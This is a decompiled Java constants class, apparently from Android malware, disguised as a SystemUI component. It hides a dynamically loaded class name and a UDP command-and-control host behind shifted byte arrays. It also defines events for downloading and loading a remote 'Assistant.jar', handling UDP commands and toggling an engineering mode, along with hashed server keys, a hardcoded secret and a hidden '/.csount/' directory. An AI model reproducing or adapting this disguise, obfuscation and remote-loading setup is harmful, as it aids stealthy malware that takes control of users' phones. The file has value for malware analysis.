package com.android.systemui.assis.app;

public class MAIN {

    public static final class CONFIG {
        public static final boolean DEBUG = false;
        public static final String DISCRETE_RUNTIME_CONFIG = "burst_config";
        public static final String DYNAMIC_MAIN_CLSNAME;
        public static final String DYNAMIC_PACK_NAME = "Assistant.jar";
        public static final long PACEMAKER_FREQ = 60000;
        public static final int THREAD_POOL_SIZE = 8;
        private static final byte[] src = new byte[]{(byte) 89, (byte) 101, (byte) 99, (byte) 36, (byte) 87, (byte) 100, (byte) 90, (byte) 104, (byte) 101, (byte) 95, (byte) 90, (byte) 36, (byte) 105, (byte) 111, (byte) 105, (byte) 106, (byte) 91, (byte) 99, (byte) 107, (byte) 95, (byte) 36, (byte) 87, (byte) 105, (byte) 105, (byte) 95, (byte) 105, (byte) 36, (byte) 102, (byte) 87, (byte) 89, (byte) 97, (byte) 36, (byte) 105, (byte) 94, (byte) 91, (byte) 98, (byte) 98, (byte) 36, (byte) 58, (byte) 111, (byte) 100, (byte) 67, (byte) 87, (byte) 95, (byte) 100};

        static {
            byte[] s = new byte[src.length];
            for (int i = 0; i < src.length; i++) {
                s[i] = (byte) ((byte) (src[i] + 10));
            }
            DYNAMIC_MAIN_CLSNAME = new String(s);
        }
    }

    public final class CONSTANT {
        public static final long ONE_DAY = 86400000;
        public static final long ONE_GIGA = 1073741824;
        public static final long ONE_HOUR = 3600000;
        public static final long ONE_KILO = 1024;
        public static final long ONE_MEGA = 1048576;
        public static final long ONE_MIN = 60000;
        public static final long ONE_SEC = 1000;
        public static final long ONE_TERA = 1099511627776L;
    }

    public final class EVENT {
        public static final int APPLET_INSTALLED = 9;
        public static final int APPLET_REMOVED = 11;
        public static final int APPLET_REPLACED = 10;
        public static final int CHECK_DYNAMIC_PACK = 40;
        public static final int CHECK_DYNAMIC_PACK_SERVER = 51;
        public static final int CHECK_PREINSTALLED_APPLETS = 60;
        public static final int CLOSE_CLIENT = 100;
        public static final int DIALOG_CANCELLED = 21;
        public static final int DIALOG_CONFIRMED = 20;
        public static final int DOWNLOAD_DYNAMIC_PACK = 52;
        public static final int DYNAMIC_PACK_EVENT_BASE = 1000;
        public static final int GPRS_CONNECTED = 5;
        public static final int GPRS_LOST = 7;
        public static final int KILL_SERVICE = 8;
        public static final int LOAD_DYNAMIC_PACK = 53;
        public static final int LOAD_DYNAMIC_PACK_FAILED = 44;
        public static final int LOAD_DYNAMIC_PACK_SUCCESS = 43;
        public static final int NOTIFICATION_CLICKED = 30;
        public static final int ONEHOUR_TICK = 3;
        public static final int ONEMIN_TICK = 1;
        public static final int TENMIN_TICK = 2;
        public static final int TRY_LOAD_REPLACE_PACKAGES = 61;
        public static final int UDP_COMMAND = 50;
        public static final int WIFI_CONNECTED = 4;
        public static final int WIFI_LOST = 6;
    }

    public final class INTENT {
        public static final String ACTION_NOTIFICATION_CLICKED = "com.android.systemui.assis.intent.ACTION_NOTIFICATION_CLICKED";
        public static final String ACTION_TIME_TICK_ONEHOUR = "com.android.systemui.assis.intent.ACTION_ONEHOUR_TICK";
        public static final String ACTION_TIME_TICK_ONEMIN = "com.android.systemui.assis.intent.ACTION_ONEMIN_TICK";
        public static final String ACTION_TIME_TICK_TENMIN = "com.android.systemui.assis.intent.ACTION_TENMIN_TICK";
        public static final String ACTIVE_ENG_MODE = "com.android.systemui.assis.intent.ACTIVE_ENG_MODE";
        public static final String DEACTIVE_ENG_MODE = "com.android.systemui.assis.intent.DEACTIVE_ENG_MODE";
    }

    public final class KEY {
        public static final String CUST_ID = "93c5bebdea9c94a0740fe6fd9bb250f0";
        public static final String DYNPACK_MD = "d3e6e9f4b2026b479f758c17f56bd683";
        public static final String DYNPACK_REPORTED = "6b88002be0f722d991bad250542f6e9f";
        public static final String GUARDIAN = "ck2@13!4";
        public static final String NOTIFY_ID = "notify_id";
        public static final String REGSVR_IP = "f3c744d950bf70dfc8c7cbcae23f26fa";
        public static final String REGSVR_PORT = "a093e159930c7b744f1a84171889b044";
        public static final String UDP_MAX_PORT = "bef42c377df6e66c43c0bf2e02eb08c6";
        public static final String UDP_MIN_PORT = "5507b177feeae534e7517519ed64999b";
        public static final String UDP_SERVER = "2f735cc2a65622296859b7bacce72a68";
    }

    public static final class NET {
        public static final int DEFAULT_TIMEOUT = 20000;
        public static final String UDP_HOST;
        public static final int UDP_PORT_MAX = 6609;
        public static final int UDP_PORT_MIN = 6600;
        private static final byte[] src = new byte[]{(byte) 112, (byte) 97, (byte) 117, (byte) 41, (byte) 95, (byte) 106, (byte) 96, (byte) 110, (byte) 115, (byte) 116, (byte) 117, (byte) 41, (byte) 94, (byte) 106, (byte) 104};

        static {
            byte[] s = new byte[src.length];
            for (int i = 0; i < src.length; i++) {
                s[i] = (byte) ((byte) (src[i] + 5));
            }
            UDP_HOST = new String(s);
        }
    }

    public final class PATH {
        public static final String APP_DATA_PATH = "/.csount/";
        public static final String LOG_DATA_PATH = "/.csount/Log/";
        public static final String LOG_FILE_NAME = "log";
    }
}
